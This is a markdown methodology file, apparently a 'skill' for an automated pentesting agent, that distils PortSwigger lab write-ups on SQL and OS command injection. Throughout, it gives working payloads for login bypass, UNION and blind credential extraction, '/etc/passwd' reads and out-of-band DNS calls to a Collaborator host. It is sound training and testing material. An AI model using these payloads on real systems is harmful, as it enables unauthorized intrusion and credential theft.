# Injection Skill

> Provenance: migrated from `methodology/injection.md`. Content preserved verbatim; original file kept as source of truth.

## Core Concept

Injection occurs when untrusted input is interpreted as part of a query, command, or expression instead of as data. The attacker's input changes the structure of the interpreted statement, breaking the intended data/code boundary.

- Key classes:

- SQL injection (string-literal, numeric, and query-structure contexts)
- Blind SQL injection (boolean/conditional-response and time-based oracles)
- OS command injection
- LDAP / XPath / XML injection
- Template injection (SSTI)
- Header-based injection contexts

## Security Boundary

The boundary crossed is the separation between:

attacker-controlled data
→ intended fixed program logic

When input is concatenated into an interpreted statement, the data/logic boundary dissolves and the attacker can reprogram the statement.

## Recognition Patterns

- Input reaches a backend interpreter (SQL, shell, expression engine).
- Single quotes, double quotes, or other syntax characters produce observable behavior differences (errors, status-code changes, response-size changes, timing).
- Reflection of input or error messages referencing query syntax.
- Category/filter/search parameters that drive listing queries (common WHERE-clause injection points).

## Common Locations

- Search and filter parameters (e.g., `?category=`, `?search=`)
- Sort/order parameters
- Login forms (authentication bypass contexts)
- Product detail identifiers (WHERE contexts on IDs)
- Headers: Cookie, User-Agent, Referer, X-Forwarded-For
- API request bodies (JSON/XML fields that reach query construction)
- Cookie header values (e.g., tracking/session identifiers interpolated into queries)
- Any request attribute the server persists or queries on: headers, cookies, referers, user agents

## Indicators

- HTTP 500 or application error on quote/syntax characters
- 500 on `x' OR 1=1` but 200 on `x' OR 1=1 --` → trailing SQL exists after the injection point
- Response size/count differences between baseline and boolean-tautology payloads (data disclosure)
- Duplicate or additional records vs. baseline (bypassed visibility/ownership filters)
- 302 redirect to an authenticated page after credential-form injection → authentication bypass

Blind-SQLi oracle workflow (when nothing renders — one bit per request):

1. Find a stable boolean signal: message presence/absence, response size delta, timing, status difference. It must be query-result-dependent and deterministic.
2. Confirm controllability: tautology vs. contradiction (`' AND '1'='1` / `' AND '1'='2`) must flip the signal.
3. If plain payloads fail but quote-balanced ones work, the app appends a closing quote — terminate payloads with `--` (comment) or end in a balancing string. Expose this with `' AND 1=1--` vs `' AND 1=1`.
4. Verify target data exists (`AND (SELECT 'a' FROM users WHERE username='administrator')='a` style) before extraction.
5. Determine data length exactly: bracket with `LENGTH(x)>N-1` (true) and `>N` (false) — do not infer from a single comparison.
6. Extract per character: `AND (SELECT ASCII(SUBSTR(password,N,1)) FROM users WHERE username='administrator')>M--` via binary search (32–126, ~6 requests/char). Automate only after the oracle is fully characterized.
7. Error and FALSE are indistinguishable in a boolean oracle: "impossible false" results indicate a payload-shape (quote-balance/syntax) problem, not data values.
8. SUBSTR beyond the string returns empty; ASCII of it yields always-false comparisons, so binary search converges to 32 (space). A trailing-space artifact at position N+1 means the true length is N.
9. When NO natural signal exists (no message, no size delta, no rendered data), manufacture one: `UNION SELECT CASE WHEN (<cond>) THEN TO_CHAR(1/0) ELSE 'a' END FROM <table>--` — TRUE→500, FALSE→200. Errors are the most universally observable channel.
10. Signal hierarchy for blind SQLi: rendered data > message oracle > size delta > status/error > timing. Probe for the cheapest stable signal first; manufacture an error oracle when none exists.
11. Probe the backend grammar before committing to payload shapes: bare `(1=1)` parens, a FROM-less subquery (`(SELECT 'x')='x'`), a simple UNION, and `||` concat. If FROM-less SELECTs all error, the backend mandates FROM (Oracle-family grammar) — restructure payloads around a FROM clause.
12. CASE branches must be type-consistent on strict engines: `THEN TO_CHAR(1/0) ELSE 'a' END` (text-typed) or `THEN 1/0 ELSE 1` (integer-typed). Mismatched-type branches error regardless of the condition.

Error-based extraction (when the app surfaces DB error text — PostgreSQL-style):

1. Classify the error surface first: value-reflecting cast errors (`x::int` → "invalid input syntax for type integer: '<VALUE>'") leak the full value in ONE request; query-echo errors ("Unterminated string literal ... in SQL <full query>") leak the query shape; generic syntax errors leak nothing. Only some error classes render the rich error page — map which.
2. Cast-leak pattern: `x'||(SELECT <column>::int FROM <table> LIMIT 1)||'` — the cast error embeds the column's value verbatim.
3. Input truncation is a hidden budget: measure it empirically with fixed-length padding probes before crafting leaking payloads. Shorten fixed overhead (short injection value, minimal SQL) to fit; drop WHERE clauses in favor of LIMIT/ORDER BY when they won't fit.
4. Verify which row a budget-constrained query returned by USING the leaked value (login) rather than assuming its identity.

## Testing Methodology

1. Establish baseline: normal value, record status code, size, and result count.
2. Syntax-break test: append `'` (or `"`, `)`, `;` depending on context). An error/500 indicates the input is interpolated into an interpreted statement.
3. Boolean-tautology test: `' OR 1=1` — if 500/error occurs, the injected string is followed by trailing SQL (e.g., `AND released = 1`).
4. Comment test: `' OR 1=1 --` — neutralize trailing structure; a 200 with additional results confirms the full injection context.
5. Compare result counts/names against baseline to measure disclosure.
6. For deeper impact (UNION attacks), enumerate columns/tables only after the basic injection context is confirmed and testing remains within authorized scope.

Step-by-step example (WHERE-clause string-literal injection):

- baseline `Gifts` → 200, 3 rows
- `Gifts'` → 500 (interpolation confirmed)
- `Gifts' OR 1=1` → 500 (trailing SQL exists)
- `' OR 1=1 --` → 200, 20 rows (visibility restriction bypassed)

Login-bypass variant (credential WHERE clause):

- baseline random credentials → in-page rejection ("Invalid username")
- `username=administrator'` → 500 (interpolation in credential query confirmed)
- `username=administrator'--` + any password → 302 to authenticated page (password condition commented out)

Prefer the targeted bypass (`known-user'--`) over a blanket tautology (`' OR 1=1--`) in credential contexts: it yields a specific, high-value identity and deterministic, verifiable session state.

UNION-based extraction sequence (in-band data disclosure):

1. Confirm the injection (syntax break → 500/error differential).
2. Find the column count: `' UNION SELECT NULL--`, then increment NULLs (`NULL,NULL`, `NULL,NULL,NULL`, ...) until the query succeeds (200). Errors at N-1 and N+1 bracket the true count.
3. Identify rendered/text columns: place a literal (`'a'` or the target string) in each position. Interpret results: 200 + displayed → text-tolerant and rendered (extraction-ready); 200 + not displayed → text-tolerant but unrendered; 500 → non-text column. Multiple positions can render — any is usable. When the objective payload is itself a literal, this step subsumes the probe.
4. Substitute the real subquery into a rendered text column, keeping NULLs elsewhere (e.g., `' UNION SELECT banner,NULL FROM v$version--`).
5. Proceed to schema enumeration (`table_name`/`column_name` from the DB's dictionary views) and data extraction — within authorized scope only.

Database-specific requirements:

- Oracle: SELECTs require a `FROM` clause — use `FROM dual` for literals; version = `SELECT banner FROM v$version`; metadata = `all_tables` / `all_tab_columns`; string concat = `||`.
- MySQL: `SELECT @@version` (no FROM needed); metadata = `information_schema`; concat = `CONCAT()`.
- PostgreSQL: `SELECT version()` (no FROM needed); metadata = `information_schema`; concat = `||`.
- Syntax acceptance itself fingerprints the DB: which of `dual`/`@@version`/`version()` is accepted reveals the backend.

Schema-enumeration chains (objective: users table → columns → credentials):

- Non-Oracle (MySQL/PostgreSQL/MSSQL): `UNION SELECT table_name,NULL FROM information_schema.tables--` → `UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='<T>'--` → `UNION SELECT <user>||'~'||<pass>,NULL FROM <T>--`.
- Oracle: same steps with `all_tables` / `all_tab_columns WHERE table_name='<T>'` (user tables are then queried bare: `FROM <T>`).
- Enumerate metadata before extracting data: real targets often use randomized/obfuscated identifiers (e.g., `users_wbhcjp`, `password_yzzzkv`) — never guess table/column names.
- The table-enumeration response doubles as backend fingerprinting: system-table leakage (`pg_*` → PostgreSQL, etc.) identifies the DB for free.
- When the UI renders only one column, concatenate wanted fields into it with a distinctive separator (`|| '~' ||` on Oracle/PostgreSQL, `CONCAT(a,'~',b)` on MySQL) — this also makes multi-field rows unambiguous to parse.
- Extraction strategy: try the standard-name guess first (`users`, `username`, `password`) — one cheap request, 200-vs-500 adjudicates instantly — with metadata enumeration as the fallback when names are randomized/obfuscated. Enumeration-first is only justified when the guess fails.
- A UNION injection is an arbitrary-read primitive scoped only by the DB account's privileges: any table the connection can read is extractable, not just the table in the original query. One injection point compromises the whole readable data layer.

## Verification

- Reproduce the payload and confirm the result is deterministic.
- Compare against baseline: additional rows must be attributable to the payload, not to caching or randomness.
- Confirm the disclosed data is actually outside the intended visibility boundary (e.g., unreleased products, other users' data).
- Alternative explanations considered: caching, soft404s, different rendering. Rule these out by comparing result sets and status codes against the baseline.
- Success criteria are context-dependent: data disclosure is measured by result counts/content; authentication bypass is measured by authenticated session state (redirect + account page rendering the target identity + valid session cookie). A 302 to an authenticated page is stronger evidence than a 200 body change — always inspect the resulting session directly.
- For forms protected by CSRF tokens: fetch the token and session cookie from the same response, and resubmit them as a pair.

## Common Failure Modes

- Blindly firing payloads without a baseline → cannot measure behavior differences.
- Using `OR 1=1` without a comment when trailing SQL exists → 500 error and a wrong "not vulnerable" conclusion.
- Assuming a 500 means "not vulnerable" — an error response can be evidence of the injection, not absence of it.
- Reporting the lab/found vuln as solved without verifying actual disclosure (row counts/names vs. baseline).

## Impact Considerations

- Data disclosure (bypassing visibility flags such as `released`, `published`, `deleted`)
- Authentication bypass (WHERE clauses on credentials)
- Full data extraction via UNION attacks (in scope-permitted testing)
- Potential write/DDL impact where the grammar allows
- OS command execution as the app user (see OS Command Injection below)

## OS Command Injection

Same data/code-boundary failure applied to shell commands: input interpolated unquoted into a command line (e.g. stock-check params into `stockreport.sh`).

Recognition: shell-error leaks naming scripts (`stockreport.sh: line 5: $2: unbound variable`); metacharacters (`;`, `|`) produce command errors/output.

Line-construction mapping: use `|echo MARKER` probes — trailing values (e.g. appended second parameter) surface in output; `;id` suffixes expose segment execution and user contexts.

Output gating: output may display ONLY on exit code 0 (errors otherwise). Trailer-breaking file commands need exit-code control — comment the trailer (`1|cat /etc/passwd #`); `id <int>`/`pwd`/`echo` are trailer-tolerant probes (`id 9` legally queries uid 9 — distinguish from breakage).

Testing sequence: metachar proof (`;`, `|`) → construction mapping (echo markers, `;id` dual outputs) → file reads with `#` trailer neutralization → `/etc/passwd` content + solved marker. RCE (`id`/`pwd`) is necessary but not sufficient — file READ is the usual criterion.

Common failure modes: mistaking `id <int>` output for breakage-free execution context; theorizing line construction instead of mapping it with echo probes; forgetting the `#` comment after proving RCE.

Blind time-based variant: with no output reflected, bind session FIRST (invalid-request timings are meaningless), baseline response time, then matrix `;`/`&`/`|` with `sleep 10` (+ `#` trailer) per field; ≥2 agreeing separators (~10s vs ~0.3s baseline) + one negative = proof. Delay magnitude dwarfs jitter — no statistics needed. The triggered delay itself may satisfy detection-lab objectives (check the solved marker right after).

Blind redirection variant: where a writable web dir is servable (`/image?filename=` → `/var/www/images/`), convert blind execution to readable output — sleep-proof first, then `cmd > <webdir>/<rand>.txt #` and fetch. Check the solved marker after EACH capability rung (it may flip before any secret is found).

Blind OOB-interaction variant: where exfiltration/time proofs are unnecessary, trigger server-side DNS/HTTP to the Collaborator (`email=t@t.com; nslookup <unique>.burpcollaborator.net #`) and wait 60–90s for instance-attributed solve. Firewall typically permits Collaborator only — don't substitute other receivers without evidence. Compose sink knowledge (session-bound feedback shape) with OOB discipline (unique subdomain, async wait, marker check).

### Name the sink's interpreter before judging the sanitizer
A sanitizer only defends the interpreter it was written for. Read the sink first, then
ask whether the control upstream matches that interpreter — the mismatch is the finding,
and it is invisible to a reviewer who only checks "is there a sanitizer?".

- `sanitize_text_field()` / `strip_tags()` in a **shell** context is a category error.
  It removes HTML, and leaves every shell metacharacter intact: `;` `|` `&` `` ` ``
  `$( )` `${ }` newline. Passing a "sanitized" value into `shell_exec()` looks defended
  on a skim read and executes anyway.
- The reverse is just as common: `escapeshellarg()` in a **SQL** context, HTML-escaping
  into a script context, or `htmlspecialchars()` guarding a SQL string.
- **Read what the sibling arguments do.** The strongest evidence that a missing escape
  is a defect rather than a design decision is *the other arguments in the same call
  are escaped and this one is not*. A `mysqldump()` line where user, password, host and
  database name are all wrapped in `escapeshellarg()` and only the exclude-table values
  are interpolated raw is not a considered trade-off — it is an omission, and the
  inconsistency is provable in one sentence. See `../verification-skill/SKILL.md` for
  the general differential-control technique.
- **`escapeshellarg()` is the floor, not the ceiling.** It is designed for a direct
  `exec`-family call, not for a value that then reaches a command *interpreter*
  (`sh -c`, `bash -c`, `eval`, a shell script that re-parses its arguments). Check what
  sits between the escape and the exec. Platform differences also matter: the escaping
  and quoting rules that hold for `/bin/sh` on Linux do not transfer to `cmd.exe` or
  `popen` paths.
- **A fix claim needs the hunk, not the prose.** "The patch escapes it" is a hypothesis
  until you read the changed lines, and you must also check *where* the escaping landed:
  escaping at the shell call is correct, escaping at input-storage time is wrong (it
  corrupts the persisted value and leaves the sink unprotected for any other writer).

## Lessons Learned

From PortSwigger "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data":

- Incremental payload sequence (baseline → `'` → `' OR 1=1` → `' OR 1=1 --`) maps the injection context with each step informing the next.
- The 500-vs-200 differential between tautology-with-comment and tautology-without-comment reveals trailing SQL structure.
- In listing/filter endpoints, visibility flags (released/hidden) are common WHERE-clause companions; tautologies bypass them.
- Row counting is a simple, reliable impact measurement for data disclosure.

From PortSwigger "SQL injection vulnerability allowing login bypass":

- The same incremental methodology transfers directly to credential queries: baseline → syntax break (`'` → 500) → comment bypass (`--`).
- A credential check is a WHERE clause; modifying the query modifies the authentication decision.
- CSRF tokens couple requests to sessions — the test harness must keep token and cookie bound to the same session.

From PortSwigger "SQL injection attack, querying the database type and version on Oracle":

- Generic UNION recipe: NULL-increment column-count discovery → literal render test → payload substitution. 500s at N-1 and N+1 columns bracket the true count without exfiltrating anything.
- Oracle requires `FROM dual` for literal SELECTs; `v$version.banner` holds the version. DB-specific syntax acceptance (dual / `@@version` / `version()`) doubles as a fingerprinting oracle.
- Identify which result columns the application renders before placing payloads; padding non-rendered positions with NULL avoids type errors.

From PortSwigger "SQL injection attack, querying the database type and version on MySQL and Microsoft":

- Comment syntax is backend- and instance-specific and a frequent silent failure: MySQL/MSSQL accept `-- ` (with trailing space) and MySQL also `#`; Oracle/PostgreSQL use `--`. When a payload that "should work" fails, isolate variables in order: injection (quote test) → terminator (empty-comment test `x'--` vs `x'#`) → structure (NULL increments).
- The empty-comment test is a cheap, decisive diagnostic: `x'--` failing while `x'#` succeeds proves the comment, not the payload, is the problem.
- Change one variable at a time between failed payloads — combining unknowns (comment + column count) multiplies wasted requests.

From PortSwigger "SQL injection UNION attack, determining the number of columns returned by the query":

- The NULL-increment probe is instance-portable but never transferable by assumption: identical app templates had 2 columns on some instances and 3 on others. Probe fresh every time.
- A 200 with a size delta of ~one row proves the UNION row rendered — stronger than 200 alone. Not all 500s are identical: error-body size differences can hint at which mismatch (too few vs. too many columns) occurred.

From PortSwigger "SQL injection UNION attack, finding a column containing text":

- Rendered-position results are three-valued, not boolean: 200+displayed (usable), 200+undisplayed (text but unrendered), 500 (non-text). Check the body, not just the status code.
- Literal placement and the objective can be the same payload when the target is a known string — one request per position, no separate probe needed.

From PortSwigger "Visible error-based SQL injection":

- Value-reflecting cast errors (`password::int` → "invalid input syntax for type integer: '<password>'") extract the whole value in one request — prefer over per-character oracles whenever error text is surfaced.
- Unterminated-string errors leak the full query text: free grammar/table/injection-shape reconnaissance.
- Truncation budgets must be measured (padding probes) before payload crafting; short fixed values and LIMIT-instead-of-WHERE are the budget-fitting moves.
- "500 bare" vs "500 with rich error page" is a meaningful distinction — only specific error classes render the leak page.

From PortSwigger "Blind SQL injection with conditional errors":

- When no natural signal exists, manufacture the oracle: CASE + deliberately-erroring branch converts any boolean question into a 500-vs-200 bit. UNION placement (as the row source) bypasses the original WHERE entirely.
- A failed "impossible" payload class is a grammar fingerprint: FROM-less SELECTs/subqueries all erroring → Oracle-family backend; restructure payloads around a FROM clause.
- Transferring a prior lab's payload grammar to a new instance cost ~12 stuck requests — the systematic probe matrix (bare parens / FROM-less subquery / UNION / concat) isolates grammar from condition in four requests.
- CASE branch type-consistency is mandatory on strict engines (TO_CHAR(1/0) vs 'a').

From PortSwigger "Blind SQL injection with conditional responses":

- A greeting/conditional message tied to query results is a boolean side channel: any observable, deterministic difference (message, size, timing) suffices to exfiltrate data one bit per request — absence of rendering is not a defense.
- Appended-quote structure: when numeric-tail payloads all return "false" (including impossible-false ones), the app is closing the injected string — fix with `--` termination; error and false are indistinguishable in the signal alone.
- Length must be bracketed exactly (`>N-1` true, `>N` false); an unverified length produces an artifact character (SUBSTR-past-end → always-false → converges to ASCII 32/space) and a failed login.
- Cookie values are first-class injection points — test them like any parameter.

From PortSwigger "SQL injection UNION attack, retrieving data from other tables":

- UNION replaces the original row set: the injected SELECT's FROM is attacker-controlled, so the injection point is an arbitrary-read primitive over every readable table.
- Standard-name-first heuristic: guess `users(username, password)` in one request before enumerating — 200/500 adjudicates instantly; enumeration stays the fallback for randomized identifiers.
- Extraction + credential login combine into one impact chain when credentials are stored in plaintext.

From PortSwigger "SQL injection attack, listing the database contents on Oracle / on non-Oracle databases":

- The full extraction chain (enumerate tables → enumerate columns → extract credentials → login) validates the recipe across Oracle, MySQL, and PostgreSQL: identical steps, only dictionary views (`all_*` vs `information_schema`) and concat idioms (`||` vs `CONCAT`) differ.
- Randomized table/column identifiers are a real-world obfuscation pattern — enumerate metadata, never guess names.
- Injected rows interleave with legitimate listing content: use distinctive separators and full-document parsing rather than positional greps.
- System-table names leaked during table enumeration fingerprint the backend (e.g., `pg_*` → PostgreSQL) at no extra cost.
- Re-verifying observations from an interrupted session costs a few requests and removes the risk of acting on stale state — stored observations are hypotheses, not facts.

From PortSwigger "OS command injection, simple case":

- Shell-error leaks (`stockreport.sh: line 5`) name the sink; `|echo MARKER` maps the appended trailer; output gated on exit-0 forces `#` trailer comments for file reads (`1|cat /etc/passwd #` → full passwd + `is-solved`). `id <int>` is a legal query — not evidence of missing trailers.

From PortSwigger "Blind OS command injection with time delays":

- Feedback email `test@test.com; sleep 10 #` → 10.4s vs 0.34s baseline (`&` agrees at 10.3s, `|` negative at 0.36s) → `is-solved` on delay alone. Session-bind before timing; matrix all three separators.

From PortSwigger "Blind OS command injection with output redirection":

- Same feedback sink; `; sleep 8 #` → 8.4s proof, then `; whoami > /var/www/images/out1.txt #` → fetched `peter-u9i2Gm`; home listings exfiltrated the same way → `is-solved` with no secret required. Marker-check per rung.

From PortSwigger "Blind OS command injection with out-of-band interaction":

- Same feedback sink; `; nslookup <unique>.burpcollaborator.net #` → 0.36s return, 60s wait → `is-solved` by instance attribution (no client polling). Collaborator-only egress assumed from blind-SSRF lesson; DNS-only is the cheapest primitive.

## Related Concepts

- Authentication bypass via SQL injection
- UNION-based extraction (see UNION labs)
- Blind SQLi boolean oracle (conditional responses) — validated; time-based variant still future work
- OS command injection (see OS Command Injection section above)
- methodology/verification.md (differential testing)

## Sources

- PortSwigger lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data (knowledge/portswigger/labs/sql-injection-where-clause-hidden-data.md)
- PortSwigger lab: SQL injection vulnerability allowing login bypass (knowledge/portswigger/labs/sql-injection-login-bypass.md)
- PortSwigger lab: SQL injection attack, querying the database type and version on Oracle (knowledge/portswigger/labs/sql-injection-oracle-version.md)
- PortSwigger lab: SQL injection attack, querying the database type and version on MySQL and Microsoft (knowledge/portswigger/labs/sql-injection-mysql-version.md)
- PortSwigger lab: SQL injection UNION attack, determining the number of columns returned by the query (knowledge/portswigger/labs/sql-injection-union-column-count.md)
- PortSwigger lab: SQL injection attack, listing the database contents on Oracle (knowledge/portswigger/labs/sql-injection-oracle-list-contents.md)
- PortSwigger lab: SQL injection attack, listing the database contents on non-Oracle databases (knowledge/portswigger/labs/sql-injection-nonoracle-list-contents.md)
- PortSwigger lab: SQL injection UNION attack, finding a column containing text (knowledge/portswigger/labs/sql-injection-union-text-column.md)
- PortSwigger lab: SQL injection UNION attack, retrieving data from other tables (knowledge/portswigger/labs/sql-injection-union-other-tables.md)
- PortSwigger lab: SQL injection UNION attack, retrieving multiple values in a single column (knowledge/portswigger/labs/sql-injection-union-single-column.md)
- PortSwigger lab: Blind SQL injection with conditional responses (knowledge/portswigger/labs/sql-injection-blind-conditional-responses.md)
- PortSwigger lab: Blind SQL injection with conditional errors (knowledge/portswigger/labs/sql-injection-blind-conditional-errors.md)
- PortSwigger lab: Visible error-based SQL injection (knowledge/portswigger/labs/sql-injection-visible-error-based.md)
- PortSwigger lab: OS command injection, simple case (knowledge/portswigger/labs/os-command-injection-simple-case.md)
- PortSwigger lab: Blind OS command injection with time delays (knowledge/portswigger/labs/os-command-injection-blind-time.md)
- PortSwigger lab: Blind OS command injection with output redirection (knowledge/portswigger/labs/os-command-injection-blind-redirect.md)
- PortSwigger lab: Blind OS command injection with out-of-band interaction (knowledge/portswigger/labs/os-command-injection-blind-oob.md)
